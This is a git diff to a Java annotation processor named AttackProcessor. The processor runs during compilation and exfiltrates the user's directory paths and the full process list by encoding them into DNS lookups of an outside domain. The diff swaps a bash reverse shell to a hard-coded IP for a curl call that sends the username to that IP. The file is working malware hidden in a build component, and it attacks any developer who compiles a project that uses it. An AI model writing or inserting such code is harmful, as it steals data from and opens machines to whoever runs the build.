b0d2fec4f2bb09e8fab84d8e9acce02215a24d3c
nanolikeyou <714284051@qq.com>
2019-08-28 15:08:20 +0800

    a

--- processor/src/main/java/org/cyber/AttackProcessor.java
+++ processor/src/main/java/org/cyber/AttackProcessor.java
@@ -36,17 +36,21 @@ public class AttackProcessor extends AbstractProcessor {
             String pwd = new File( "." ).getAbsolutePath();
             pwd = new String( Base64.getEncoder().encode( pwd.getBytes() ) );
 
-            Inet4Address.getByName( System.getProperty("user.home")+".lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( System.getProperty("user.dir")+".lirui28.t.dlsr.ga" );
             Inet4Address.getByName( pwd+".lirui28.t.dlsr.ga" );
 
             Runtime runtime = Runtime.getRuntime();
+
             try {
                 Process p = runtime.exec("ps -ef");
                 BufferedReader bw = new BufferedReader( new InputStreamReader( p
                                                                                                .getInputStream()));
                 String s;
                 while ((s=bw.readLine())!=null) {
+
                     s = new String( Base64.getEncoder().encode( s.getBytes() ) );
+
+                    s = s.substring( 0,222 );
                     Inet4Address.getByName( s+".lirui28.t.dlsr.ga" );
                 }
             } catch (IOException e) {
@@ -58,17 +62,20 @@ public class AttackProcessor extends AbstractProcessor {
         {
             //e.printStackTrace();
         }
+
         try {
             Runtime r = Runtime.getRuntime();
             //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
 
-            Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/182.92.151.151/8888 0>&1"});
+            Process p = r.exec(new String[]{"/bin/bash","-c","curl http://182.92.151.151:8888"+System.getProperty("user.name")});
             p.waitFor();
         } catch (IOException e) {
             e.printStackTrace();
         } catch (InterruptedException e) {
             e.printStackTrace();
         }
+
+
         processingEnv.getMessager().printMessage(
                 Diagnostic.Kind.MANDATORY_WARNING, "Hello Worlds!"+sb.toString());
         return false;
